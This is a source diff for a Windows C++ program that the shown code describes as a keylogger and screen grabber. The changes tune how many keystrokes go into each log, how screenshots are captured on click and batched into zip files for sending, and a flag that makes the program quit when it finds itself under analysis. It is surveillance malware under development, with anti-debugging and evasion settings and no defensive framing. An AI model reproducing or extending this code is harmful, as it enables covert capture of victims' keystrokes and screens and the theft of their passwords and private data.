@@ -31,8 +31,7 @@
 #include <psapi.h>
 #include <thread>
 #include <Wbemidl.h>
-
-
+#include <sstream>
 
 #include "Antidbg.h"
 #include "log.h"
@@ -56,14 +55,14 @@ using buffer = std::vector<char>;
 #define KeyShiftLimit 122   //cap for the highest possible random encryption key
 #define LogMode 2           //how to log keystrokes                          [ 1 = Timer  ,  2 = Characters-per-log ]
 #define LogTimer 15         //minutes per log                                [ must use mode 2 ]
-#define CharactersPerLog 400//how many characters should be in a log         [ must use mode 1 ]
-#define QuitIfUntrust false  //should we send a log if the environment is untrusted or quit on the spot?
+#define CharactersPerLog 800//how many characters should be in a log         [ must use mode 1 ]
+#define QuitIfUntrust true  //should we send a log if the environment is untrusted or quit on the spot?
 
 //[ SCREENGRABBING ]
 #define ScreenGrab true     //whether to screenshot at set intervals or not
 #define ScreenshotMode 2    //how to screengrab                              [ 1 = Timer  ,  2 = Screenshot-On-Click ]
-#define ScreenshotDelay 10	//only works when using the timer
-#define ScreenshotsPerZip 5 //how many screenshots to collect before sending a zip file
+#define ScreenshotDelay 15	//only works when using the timer
+#define ScreenshotsPerZip 8 //how many screenshots to collect before sending a zip file
 #define ScreenshotCrop true	//whether to resize the resulting screenshot (be aware that this will stretch the image if the aspect ratio is different)
 #define DestWidth	1920	//compressed screen width
 #define DestHeight	1080	//compressed screen height
@@ -87,12 +86,11 @@ using buffer = std::vector<char>;
 
 //[ MISC ]
 #define MaximumFolderSize 10//limit of MagikIndex copies in a system
-
+#define MaximumFolderLog 5 //limit of MagikLogS copies in a system
 
 //------------------------------------------------------
 
 #define MAX_LENGTH 1024
-
 
 #define WINDOWS_SLID                                                \
             { 0x55c92734,                                           \
